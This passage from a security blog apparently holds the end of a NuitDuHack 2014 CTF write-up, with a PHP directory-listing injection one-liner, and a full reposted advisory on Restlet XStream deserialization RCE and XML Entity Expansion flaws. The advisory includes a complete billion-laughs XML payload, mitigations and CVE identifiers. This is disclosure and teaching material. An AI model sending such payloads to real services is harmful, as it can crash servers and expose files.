<img src="../../content/images/octopress/ndh_9.png" alt=""></p>

<p>In order to get the flag, I used a directoryIterator since many other options were cut off:</p>

<pre><code class="language-lang-php line-numbers ">$it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator('./'));while($it-&gt;valid()){echo $it-&gt;getSubPathName()."&lt;/br&gt;";$it-&gt;next();}
</code></pre>

<p><img src="../../content/images/octopress/ndh_10.png" alt=""></p>

<p>The flag is hidden in the unsuspicious file:</p>

<p><img src="../../content/images/octopress/ndh_11.png" alt=""></p>

<p>Voila!</p>

<p>Thanks to <strong>in3pids</strong>, <strong>@<em>SaxX</em></strong> and the organization for such a fun CTF!</p>
    </section>
    <footer class="post-indexfooter">
        <i class="fa fa-comments"></i> <a href="../../blog/2014/04/06/nuitduhack-2014-web-write-ups/index.html#disqus_thread">Comments</a>
    </footer>
</article>


<article class="post tag-post-tag">
    <header class="post-header">
        <span class="post-meta"><time datetime="2014-03-26">26 Mar 2014</time> on <a href="../../tag/post-tag/">post</a></span>
        <h1 class="post-title"><a href="../../blog/2014/03/26/remote-code-execution-and-xml-entity-expansion-injection-vulnerabilities-in-the-restlet-framework/">Remote code execution and XML Entity Expansion injection vulnerabilities in the Restlet framework</a></h1>
    </header>
    <section class="post-content">
        <p>This blog was published in the <a href="http://h30499.www3.hp.com/t5/HP-Security-Research-Blog/Remote-code-execution-and-XML-Entity-Expansion-injection/ba-p/6403370"><strong>HP Security research blog</strong></a> but publishing it here for greater dissemination:</p>

<h2 id="advisoryoverview">Advisory overview</h2>

<p>Restlet is a lightweight Java framework for building RESTful APIs. It comes in different flavors (Java SE, Java EE, Android, Google Web Toolkit and Google App Engine) and is composed of a core API and different extensions that provide additional functionality.</p>

<p>While adding support for the Restlet API to HP Fortify SCA, the Software Security Research group discovered that the XStream extension prior to 2.2 RC3 is susceptible to Remote Code Execution (RCE) via unsafe deserialization of XML messages. Also, versions prior to 2.1.7 and 2.2 RC1 contain APIs susceptible to XML Entity Expansion (XEE) injection, including the default extension to handle XML messages (JAXB).</p>

<h2 id="remotecodeexecutionviaunsafexstreamdeserialization"> Remote code execution via unsafe XStream deserialization</h2>

<p>RESTful APIs normally deal with JSON or XML Messages. If the latter is used, a broad set of XML data binding options are available for the developer to choose from; JAXB, JiBX and XStream amongst others. XStream is unique because it allows more than simple Java POJOs to be serialized. In particular, it allows the serialization of <a href="http://docs.oracle.com/javase/7/docs/api/java/lang/reflect/Proxy.html">Java Dynamic Proxies</a>. If the application is configured to use the XStream extension to handle XML messages, an attacker can easily abuse it by sending specially crafted XML messages that use Dynamic Proxy serialization to execute arbitrary code on the server side. HP SSR previously identified a similar vulnerability in the core XStream library and the frameworks using it (such as SpringMVC, for example).</p>

<h3 id="details">Details</h3>

<p>A dynamic proxy  can intercept calls to any method declared in the interface it implements.</p>

<p>Dynamic proxy deserialization allows an attacker to send a serialized object that invokes dynamic proxy methods during its initialization, the simplest case being a <a href="http://docs.oracle.com/javase/7/docs/api/java/util/SortedSet.html">java.util.SortedSet</a> that includes a regular object like a String and an object that proxifies the <a href="http://docs.oracle.com/javase/7/docs/api/java/lang/Comparable.html">java.lang.Comparable</a> interface. During the deserialization of the SortedSet, the “compare” method of each object in the set is invoked in order to sort the set and the proxified object will replace the original call to “compare” with the attacker’s custom payload.</p>

<p>When the Restlet controller receives a malicious XML payload, it attempts to de-serialize it using XStream, effectively executing the malicious payload. Since the application would not normally be expecting a SortedSet, it throws an exception as soon as the SortedSet is cast to the expected type but the payload has already executed.</p>

<h3 id="mitigation">Mitigation</h3>

<p>If your application relies on the use of XStream, make sure it uses at least Restlet <a href="https://github.com/restlet/restlet-framework-java/wiki/XStream-security-enhancements">2.2 RC3 where a whitelist feature</a> has been added to prevent the deserialization of unexpected objects.</p>

<h2 id="xmlentityexpansionxeeinjection"> XML Entity Expansion (XEE) injection</h2>

<p>The core API uses JAXB to unmarshall XML messages on both client and server code by default. Restlet failed to disable local entity resolution, enabling attackers to run XEE (XML Entity Expansion) attacks -- attackers could perform Denial of Service (DOS) attacks on Restlet-based web services.</p>

<p>This is not the first time we’ve found this type of problem in RESTful frameworks. Last August we found that all SpringMVC/JAXB-based web services were vulnerable to XXE (XML External Entity) attacks as described in <a href="http://www.gopivotal.com/security/cve-2013-4152">CVE-2013-4152</a> (details published by the SpringMVC team).</p>

<p>If you are not familiar with these types of vulnerabilities, you can learn how <a href="http://h30499.www3.hp.com/t5/HP-Security-Research-Blog/HP-Security-Research-Threat-Intelligence-Briefing-Episode-6/ba-p/6156265#.Uvz_OV7-S-g">XXE and XEE attacks work in our XML Entity based attacks post</a>.</p>

<p>In this case, Restlet APIs were correctly configured to disable external entity resolution by default and were not vulnerable to XXE attacks. However, Doctype blocks (DTD) processing and local entity resolution were allowed and, more importantly, could not be disabled by any configuration property, making all the Restlet-based web services consuming XML messages vulnerable to this attack.</p>

<h3 id="details">Details</h3>

<p>The following snippet describes a simplified Restlet Server Resource consuming XML messages sent by clients to create Contacts:</p>

<pre><code class="language-lang-bash line-numbers ">import org.restlet.resource.Post;  
import org.restlet.resource.ServerResource;  
import org.restlet.ext.xml.XmlRepresentation;

public class XMLResource extends ServerResource {  
    @Post("xml")
    public Contact createContact(Contact c) {
        System.out.println("Contact received: " + c.getName());
        return c;
    }
}
</code></pre>

<p>Since Restlet versions prior to version 2.1.7 and 2.2 RC1 do not disable local entity resolution, an attacker could send a contact like this:</p>

<pre><code class="language-lang-bash line-numbers ">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;  
&lt;!DOCTYPE root [  
  &lt;!ENTITY lol "lol"&gt;
  &lt;!ENTITY lol2 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;
  &lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;
  &lt;!ENTITY lol4 "&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"&gt;
  &lt;!ENTITY lol5 "&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"&gt;
  &lt;!ENTITY lol6 "&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"&gt;
  &lt;!ENTITY lol7 "&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"&gt;
  &lt;!ENTITY lol8 "&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"&gt;
  &lt;!ENTITY lol9 "&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"&gt;
]&gt;
&lt;contact&gt;  
    &lt;name&gt;&amp;lol9;&lt;/name&gt;
    &lt;lastName&gt;test&lt;/lastName&gt;
&lt;/contact&gt;  
</code></pre>

<p>When processed internally by the Restlet XML processor (that uses JAXB by default) for instantiating a Contact object, the name of the contact unfolds into more than 1 billion “lol” strings - using almost 3GB of memory and crashing the Java Virtual Machine (JVM) on the server. This attack is also known as the <a href="http://en.wikipedia.org/wiki/Billion_laughs">Billion laughs attack</a>.</p>

<p>The Restlet components affected by this vulnerability are:</p>

<ul>
<li>"xml" extension,</li>
<li>"atom", "javamail", "lucene", "odata", "openid", "rdf", "wadl", "xdb" that directly depends on the "xml" extension.</li>
<li>"jackson", "jaxb", "jibx", "xstream", "rome" that provides automatic converters.</li>
</ul>

<h3 id="mitigation"> Mitigation</h3>

<p>Update to Restlet versions 2.1.7, 2.2 RC1 and above that disable local entity resolution by default.</p>

<p>More technical details can be found in the <a href="https://github.com/restlet/restlet-framework-java/wiki/XEE-security-enhancements">Restlet technical note</a>.</p>

<h2 id="cves"> CVEs</h2>

<ul>
<li>Remote Code Execution via XStream deserialization - <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-2228">CVE-2014-2228</a>.</li>
<li>XML Entity Expand (XEE) Injection - <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-1868">CVE-2014-1868</a>.</li>
</ul>
    </section>
    <footer class="post-indexfooter">
        <i class="fa fa-comments"></i> <a href="../../blog/2014/03/26/remote-code-execution-and-xml-entity-expansion-injection-vulnerabilities-in-the-restlet-framework/index.html#disqus_thread">Comments</a>
    </footer>
</article>


<nav class="pagination" role="navigation">
        <a class="newer-posts" href="../2/"><span aria-hidden="true">←</span> Newer Posts</a>
    <span class="page-number">Page 3 of 14</span>
        <a class="older-posts" href="../4/">Older Posts <span aria-hidden="true">→</span></a>
</nav>

    </main>

    <!-- You can safely delete this line if your theme does not require jQuery -->
<script type="text/javascript" src="https://code.jquery.com/jquery-1.11.3.min.js"></script>

    <script src="../../assets/js/instantclick.min.js?v=d47df0f104" data-no-instant></script>
    <script data-no-instant>InstantClick.init();</script>
    <script data-no-instant>
        InstantClick.on('change', function() {
            prism_markdown();
            Prism.highlightAll();
        });
        InstantClick.init();
    </script>

    <script type="text/javascript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'pwntester'; // required: replace example with your forum shortname
        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function () {
            var s = document.createElement('script'); s.async = true;
            s.type = 'text/javascript';
            s.src = '//' + disqus_shortname + '.disqus.com/count.js';
            (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
        }());
    </script>

    <script type="text/javascript" src="../../assets/js/prism-loader.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../assets/js/prism.js?v=d47df0f104"></script>

</body>

